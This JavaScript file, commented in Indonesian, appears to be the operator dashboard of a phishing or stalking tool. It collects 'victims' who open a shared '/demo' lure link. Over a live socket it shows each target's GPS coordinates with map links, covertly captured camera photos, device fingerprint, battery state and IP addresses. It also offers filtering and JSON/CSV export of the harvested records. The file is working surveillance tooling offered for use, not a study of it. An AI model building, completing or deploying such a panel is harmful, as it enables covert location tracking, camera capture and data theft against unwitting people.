        // Script JS Dashboard HTML
        // Konfigurasi socket dengan retry
        const socket = io({
            reconnection: true,
            reconnectionAttempts: 5,
            reconnectionDelay: 1000,
            timeout: 10000
        });

        let victims = [];
        let photos = {};
        let currentFilter = 'all';
        let searchTerm = '';

        // Status koneksi
        socket.on('connect', () => {
            console.log('✅ Terhubung ke server');
            document.getElementById('connection-status').innerHTML = '🟢 Terhubung';
            document.getElementById('connection-status').style.color = '#00ff9d';
        });

        socket.on('disconnect', () => {
            console.log('❌ Terputus dari server');
            document.getElementById('connection-status').innerHTML = '🔴 Terputus';
            document.getElementById('connection-status').style.color = '#ff4444';
        });

        socket.on('connect_error', (error) => {
            console.log('Connection error:', error);
            document.getElementById('connection-status').innerHTML = '🟡 Error';
            document.getElementById('connection-status').style.color = '#ffaa00';
        });

        // Update stats dengan validasi data
        function updateStats() {
            const filteredVictims = filterVictimsData(victims);
            
            document.getElementById('totalVictims').textContent = filteredVictims.length;
            
            const cameraGranted = filteredVictims.filter(v => {
                return v.data && v.data.camera_access && v.data.camera_access.status === 'granted';
            }).length;
            
            const locationGranted = filteredVictims.filter(v => {
                return v.data && v.data.location && v.data.location.status === 'granted';
            }).length;
            
            document.getElementById('cameraCount').textContent = cameraGranted;
            document.getElementById('locationCount').textContent = locationGranted;
            
            // Active in last 5 minutes
            const fiveMinAgo = Date.now() - (5 * 60 * 1000);
            const activeNow = filteredVictims.filter(v => {
                const timestamp = v.timestamp ? new Date(v.timestamp).getTime() : 0;
                return timestamp > fiveMinAgo;
            }).length;
            
            document.getElementById('activeNow').textContent = activeNow;
        }

        // Filter data berdasarkan kriteria
        function filterVictimsData(data) {
            let filtered = [...data];
            
            // Filter berdasarkan pencarian
            if (searchTerm) {
                filtered = filtered.filter(v => {
                    const searchLower = searchTerm.toLowerCase();
                    return (v.victimId && v.victimId.toLowerCase().includes(searchLower)) ||
                           (v.ip && v.ip.includes(searchTerm)) ||
                           (v.data && v.data.public_ip && v.data.public_ip.includes(searchTerm));
                });
            }
            
            // Filter berdasarkan kategori
            switch(currentFilter) {
                case 'camera':
                    filtered = filtered.filter(v => v.data && v.data.camera_access && v.data.camera_access.status === 'granted');
                    break;
                case 'location':
                    filtered = filtered.filter(v => v.data && v.data.location && v.data.location.status === 'granted');
                    break;
                case 'today':
                    const today = new Date().toDateString();
                    filtered = filtered.filter(v => {
                        return v.timestamp && new Date(v.timestamp).toDateString() === today;
                    });
                    break;
            }
            
            return filtered;
        }

        // Render victim card dengan validasi data
        function renderVictim(victim) {
            if (!victim || !victim.victimId) return null;
            
            const card = document.createElement('div');
            card.className = 'victim-card';
            card.id = `victim-${victim.victimId}`;
            
            // Data dengan fallback
            const data = victim.data || {};
            const deviceInfo = data.device_info || {};
            const location = data.location || {};
            const camera = data.camera_access || {};
            const network = data.network || {};
            
            // Format data dengan aman
            const userAgent = deviceInfo.userAgent || 'Tidak tersedia';
            const platform = deviceInfo.platform || 'Tidak tersedia';
            const screenInfo = (deviceInfo.screenWidth && deviceInfo.screenHeight) ? 
                `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}` : 'Tidak tersedia';
            const batteryInfo = deviceInfo.battery || 'Tidak tersedia';
            const ipPublic = data.public_ip || 'Tidak tersedia';
            const ipLokal = victim.ip || 'Tidak tersedia';
            
            // Format timestamp
            const timestamp = victim.timestamp ? new Date(victim.timestamp) : new Date();
            const timeStr = timestamp.toLocaleTimeString();
            const dateStr = timestamp.toLocaleDateString();
            
            // Status badges
            const hasCamera = camera.status === 'granted' ? 
                '<span class="badge badge-success">📸 Camera OK</span>' : '';
            const hasLocation = location.status === 'granted' ? 
                '<span class="badge badge-success">📍 Location OK</span>' : '';
            
            card.innerHTML = `
                <div class="victim-header">
                    <div>
                        <span class="victim-id">${victim.victimId}</span>
                        ${hasCamera}
                        ${hasLocation}
                    </div>
                    <span class="timestamp">${dateStr} ${timeStr}</span>
                </div>
                
                <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
                    <span>
                        <span class="camera-indicator ${camera.status === 'granted' ? 'camera-active' : ''}"></span> 
                        Camera: ${camera.status || 'Belum diminta'}
                    </span>
                    <span>
                        <span class="camera-indicator ${location.status === 'granted' ? 'location-active' : ''}"></span> 
                        Location: ${location.status || 'Belum diminta'}
                    </span>
                </div>
                
                ${location.status === 'granted' && location.latitude ? `
                <div class="data-section">
                    <div class="data-title">📍 LOKASI GPS</div>
                    <div class="data-content">
                        <div class="info-row-dot">
                            <div class="info-label-dot">Longitude</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${location.longitude}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Akurasi</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${location.accuracy || 'N/A'} meter</div>
                        </div>
                        ${location.altitude ? `
                        <div class="info-row-dot">
                            <div class="info-label-dot">Altitude</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${location.altitude} meter</div>
                        </div>
                        ` : ''}
                        <div class="info-row-dot">
                            <div class="info-label-dot">Maps</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">
                                <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" 
                                target="_blank" class="map-link">🔍 Buka di Google Maps</a>
                            </div>
                        </div>
                    </div>

                </div>
                ` : ''}
                
                ${data.location_address ? `
                <div class="data-section">
                    <div class="data-title">🏠 ALAMAT</div>
                    <div class="data-content">
                        ${data.location_address}
                    </div>
                </div>
                ` : ''}
                
                <div class="data-section">
                    <div class="data-title">📱 INFO DEVICE</div>
                    <div class="data-content">
                        <div class="info-row-dot">
                            <div class="info-label-dot">Platform</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${platform}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Browser</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${userAgent.length > 60 ? userAgent.substring(0, 60) + '...' : userAgent}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Screen</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${screenInfo}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Battery</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${batteryInfo}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Language</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${deviceInfo.language || 'N/A'}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Timezone</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${deviceInfo.timezone || 'N/A'}</div>
                        </div>
                    </div>

                </div>
                
                <div class="data-section" id="photo-${victim.victimId}">
                    <div class="data-title">📸 FOTO KAMERA</div>
                    <div class="data-content" id="photo-content-${victim.victimId}">
                        ${photos[victim.victimId] ? 
                            `<img src="${photos[victim.victimId]}" class="photo-preview" onclick="showPhoto('${victim.victimId}')">` : 
                            camera.status === 'granted' ? 'Mengambil foto...' : 'Tidak ada foto'}
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="data-title">🌐 NETWORK</div>
                    <div class="data-content">
                        <div class="info-row-dot">
                            <div class="info-label-dot">Online</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${network.online ? 'Ya' : 'Tidak'}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Koneksi</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${network.connection?.type || 'N/A'}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">Kecepatan</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${network.connection?.downlink || 'N/A'} Mbps</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">IP Public</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${ipPublic}</div>
                        </div>
                        <div class="info-row-dot">
                            <div class="info-label-dot">IP Lokal</div>
                            <div class="info-colon">:</div>
                            <div class="info-value-dot">${ipLokal}</div>
                        </div>
                    </div>

                </div>
                
                <div style="margin-top: 10px; font-size: 11px; color: #666; text-align: right;">
                    ID: ${victim.victimId}
                </div>
            `;
            
            return card;
        }

        // Update all victims dengan filter
        function updateVictimsList() {
            const grid = document.getElementById('victimGrid');
            
            if (!victims || victims.length === 0) {
                grid.innerHTML = '<div class="loading">Belum ada data korban...</div>';
                updateStats();
                return;
            }
            
            // Sort by timestamp descending
            const sortedVictims = [...victims].sort((a, b) => {
                const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
                const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
                return timeB - timeA;
            });
            
            // Apply filters
            const filteredVictims = filterVictimsData(sortedVictims);
            
            if (filteredVictims.length === 0) {
                grid.innerHTML = '<div class="loading">Tidak ada data dengan filter ini</div>';
                updateStats();
                return;
            }
            
            grid.innerHTML = '';
            filteredVictims.forEach(victim => {
                const card = renderVictim(victim);
                if (card) grid.appendChild(card);
            });
            
            updateStats();
        }

        // Handle new victim data dengan struktur yang benar
        socket.on('new-victim', (data) => {
            console.log('📥 New victim data:', data);
            
            if (!data || !data.victimId) {
                console.warn('Invalid victim data:', data);
                return;
            }
            
            // Cari victim yang sudah ada
            const existingIndex = victims.findIndex(v => v && v.victimId === data.victimId);
            
            if (existingIndex >= 0) {
                // Update data yang ada
                if (!victims[existingIndex].data) {
                    victims[existingIndex].data = {};
                }
                
                // Jika data memiliki struktur dengan type
                if (data.type && data.data) {
                    victims[existingIndex].data[data.type] = data.data;
                } 
                // Jika data langsung berisi data lengkap
                else if (data.data) {
                    victims[existingIndex].data = {
                        ...victims[existingIndex].data,
                        ...data.data
                    };
                }
                
                // Update timestamp
                if (data.timestamp) {
                    victims[existingIndex].timestamp = data.timestamp;
                }
                
                // Update IP
                if (data.ip) {
                    victims[existingIndex].ip = data.ip;
                }
                
            } else {
                // Victim baru - buat struktur yang benar
                const newVictim = {
                    victimId: data.victimId,
                    timestamp: data.timestamp || new Date().toISOString(),
                    ip: data.ip || 'Unknown',
                    data: {}
                };
                
                // Masukkan data sesuai struktur
                if (data.type && data.data) {
                    newVictim.data[data.type] = data.data;
                } else if (data.data) {
                    newVictim.data = data.data;
                }
                
                victims.push(newVictim);
            }
            
            // Hapus duplikat berdasarkan victimId (ambil yang terbaru)
            const uniqueVictims = [];
            const seen = new Set();
            
            victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            victims.forEach(v => {
                if (!seen.has(v.victimId)) {
                    seen.add(v.victimId);
                    uniqueVictims.push(v);
                }
            });
            
            victims = uniqueVictims;
            
            updateVictimsList();
        });

        // Handle initial data dengan validasi
        socket.on('init-data', (initialData) => {
            console.log('📊 Initial data received:', initialData);
            
            if (Array.isArray(initialData)) {
                // Filter data yang valid
                victims = initialData.filter(v => v && v.victimId).map(v => {
                    // Pastikan struktur data konsisten
                    if (!v.data) v.data = {};
                    return v;
                });
                
                // Hapus duplikat
                const unique = [];
                const seen = new Set();
                victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                victims.forEach(v => {
                    if (!seen.has(v.victimId)) {
                        seen.add(v.victimId);
                        unique.push(v);
                    }
                });
                
                victims = unique;
            }
            
            updateVictimsList();
        });

        // Handle photo dengan validasi
        socket.on('new-photo', (data) => {
            if (data && data.victimId && data.image) {
                photos[data.victimId] = data.image;
                
                // Update photo di card
                const photoDiv = document.getElementById(`photo-${data.victimId}`);
                if (photoDiv) {
                    photoDiv.innerHTML = `
                        <div class="data-title">📸 FOTO KAMERA</div>
                        <div class="data-content">
                            <img src="${data.image}" class="photo-preview" onclick="showPhoto('${data.victimId}')">
                        </div>
                    `;
                }
            }
        });

        // Utility functions
        function copyLink() {
            const link = window.location.origin + '/demo';
            navigator.clipboard.writeText(link).then(() => {
                alert('✅ Link demo copied: ' + link);
            }).catch(() => {
                prompt('📋 Copy link ini:', link);
            });
        }

        function exportData() {
            const dataStr = JSON.stringify(victims, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victims_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function exportCSV() {
            // Buat CSV sederhana
            let csv = 'Victim ID,Timestamp,IP,Camera,Location,Latitude,Longitude,Browser,Platform\n';
            
            victims.forEach(v => {
                const row = [
                    v.victid || '',
                    v.timestamp || '',
                    v.ip || '',
                    v.data?.camera_access?.status || '',
                    v.data?.location?.status || '',
                    v.data?.location?.latitude || '',
                    v.data?.location?.longitude || '',
                    (v.data?.device_info?.userAgent || '').replace(/,/g, ' '),
                    v.data?.device_info?.platform || ''
                ].map(cell => `"${cell}"`).join(',');
                
                csv += row + '\n';
            });
            
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victims_${Date.now()}.csv`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function clearData() {
            if (confirm('⚠️ Hapus semua data victim? Data tidak bisa dikembalikan!')) {
                victims = [];
                photos = {};
                updateVictimsList();
                
                // Optional: kirim sinyal ke server untuk clear data
                fetch('/api/clear-data', { method: 'POST' }).catch(() => {});
            }
        }

        function refreshData() {
            socket.emit('request-refresh');
            updateVictimsList();
        }

        function filterVictims() {
            searchTerm = document.getElementById('searchInput').value.toLowerCase();
            updateVictimsList();
        }

        function setFilter(filter) {
            currentFilter = filter;
            
            // Update active class
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            updateVictimsList();
        }

        function showPhoto(victimId) {
            const photo = photos[victimId];
            if (photo) {
                const modal = document.getElementById('photoModal');
                const modalImg = document.getElementById('modalImage');
                modal.style.display = 'block';
                modalImg.src = photo;
            }
        }

        function closeModal() {
            document.getElementById('photoModal').style.display = 'none';
        }

        // Click outside modal to close
        window.onclick = function(event) {
            const modal = document.getElementById('photoModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }

        // Keyboard shortcut
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closeModal();
            }
        });

        // Periodic refresh
        setInterval(() => {
            // Optional: request update dari server
            socket.emit('ping');
        }, 30000);

        console.log('Dashboard siap!');

        // Akhir Script JS Dashboard HTML

